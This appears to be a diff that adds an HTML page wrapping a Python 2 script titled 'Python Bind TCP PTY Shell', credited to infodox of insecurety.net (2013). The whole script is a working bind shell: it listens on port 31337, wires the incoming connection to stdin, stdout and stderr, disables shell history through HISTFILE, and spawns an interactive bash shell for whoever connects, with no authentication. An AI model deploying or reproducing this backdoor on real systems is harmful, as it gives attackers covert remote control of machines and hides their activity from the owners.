@@ -1,0 +1,32 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>tcp_pty_bind.py</title>
+</head><body>#!/usr/bin/python2<br/>
+"""<br/>
+Python Bind TCP PTY Shell - testing version<br/>
+infodox - insecurety.net (2013)<br/>
+<br/>
+Binds a PTY to a TCP port on the host it is ran on.<br/>
+"""<br/>
+import os<br/>
+import pty<br/>
+import socket<br/>
+<br/>
+lport = 31337 # XXX: CHANGEME<br/>
+<br/>
+def main():<br/>
+&nbsp; &nbsp; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
+&nbsp; &nbsp; s.bind(('', lport))<br/>
+&nbsp; &nbsp; s.listen(1)<br/>
+&nbsp; &nbsp; (rem, addr) = s.accept()<br/>
+&nbsp; &nbsp; os.dup2(rem.fileno(),0)<br/>
+&nbsp; &nbsp; os.dup2(rem.fileno(),1)<br/>
+&nbsp; &nbsp; os.dup2(rem.fileno(),2)<br/>
+&nbsp; &nbsp; os.putenv("HISTFILE",'/dev/null')<br/>
+&nbsp; &nbsp; pty.spawn("/bin/bash")<br/>
+&nbsp; &nbsp; s.close()<br/>
+&#09;<br/>
+if __name__ == "__main__":<br/>
+&nbsp; &nbsp; main()</body></html>
